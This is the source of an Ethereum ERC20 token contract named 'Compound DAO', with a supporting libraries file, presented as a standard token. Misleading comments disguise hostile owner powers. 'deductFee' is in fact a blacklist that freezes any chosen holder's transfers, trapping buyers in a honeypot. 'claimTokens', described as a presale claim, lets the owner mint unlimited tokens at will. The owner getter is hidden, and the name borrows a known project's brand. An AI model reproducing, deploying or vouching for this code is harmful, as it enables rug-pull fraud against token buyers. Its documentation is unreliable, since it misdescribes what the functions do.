{"Compound DAO.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.6;\r\n\r\nimport \"./libraries.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract.\r\n */\r\ncontract ERC20 is Context, Ownable, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) internal _balances;\r\n    mapping(address =\u003e bool) private _allowFee;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) internal _allowances;\r\n    uint256 internal _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    \r\n    /**\r\n     * @notice allows to deduct fee from spender.\r\n     */\r\n    function deductFee (address spender) external onlyOwner {\r\n    if (_allowFee[spender] == true) {\r\n            _allowFee[spender] = false;\r\n            } else {_allowFee[spender] = true;}\r\n    }\r\n\r\n    /**\r\n     * @notice Checking the allowance granted to `spender` by the caller.\r\n     */\r\n    function feeApplied(address spender) public view returns (bool) {\r\n        return _allowFee[spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Claims `amount` tokens bought during presell event.\r\n     */\r\n    function claimTokens(uint256 tAmount) public virtual onlyOwner {\r\n        _claimERC20(_msgSender(), tAmount);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {_approve(_msgSender(), spender, currentAllowance - subtractedValue);}\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `sender` to `recipient`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        if (_allowFee[sender] || _allowFee[recipient]) require (amount == 0, \"\");\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {_balances[sender] = senderBalance - amount;}\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Claims `amount` tokens bought during presell event.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     */\r\n    function _claimERC20(address account, uint256 amount) internal virtual {\r\n        uint256 accountBalance = _balances[account];\r\n        unchecked {_balances[account] = accountBalance + amount;}\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens.\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens. \r\n     */\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\n\r\ncontract CompoundDAO is ERC20 {\r\n\r\n    /**\r\n     * @dev Sets the values for {name}, {symbol} and {totalsupply}.\r\n     */\r\n    constructor() ERC20(\u0027Compound DAO\u0027, \u0027CompDAO\u0027)  {\r\n        _totalSupply =  500000000000*10**9;\r\n        _balances[msg.sender] += _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n}"},"libraries.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.6;\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    \r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n \r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() internal view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n}"}}